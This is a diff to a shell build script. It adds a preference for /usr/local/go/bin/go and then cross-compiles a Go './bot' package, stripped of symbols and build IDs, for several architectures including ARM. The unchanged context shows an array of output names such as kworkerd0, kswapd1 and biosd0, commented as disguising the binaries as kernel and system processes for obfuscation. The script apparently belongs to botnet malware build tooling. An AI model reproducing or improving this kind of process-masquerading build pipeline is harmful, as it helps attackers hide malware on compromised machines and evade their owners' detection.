@@ -29,6 +29,14 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 # Project root is one level up from tools/
 PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
 
+# Find Go binary — prefer /usr/local/go/bin/go over system PATH
+if [ -x "/usr/local/go/bin/go" ]; then
+    GO_BIN="/usr/local/go/bin/go"
+else
+    GO_BIN="go"
+fi
+echo "Using Go: $GO_BIN ($($GO_BIN version 2>/dev/null))"
+
 # Array of binary names to use for obfuscation (disguised as kernel/system processes)
 AMBS=("kworkerd0" "ethd0" "mdsync1" "ksnapd0" "kswapd1"
       "ip6addrd" "deferwqd" "devfreqd0" "kintegrity0" "biosd0" "kpsmoused0"
@@ -56,9 +64,9 @@ build_for_arch() {
     
     if [ -n "$goarm" ]; then
         # ARM architectures require GOARM setting
-        GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" go build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
+        GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" $GO_BIN build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
     else
-        GOOS="$goos" GOARCH="$goarch" go build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
+        GOOS="$goos" GOARCH="$goarch" $GO_BIN build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
     fi
     
     # Check if build succeeded
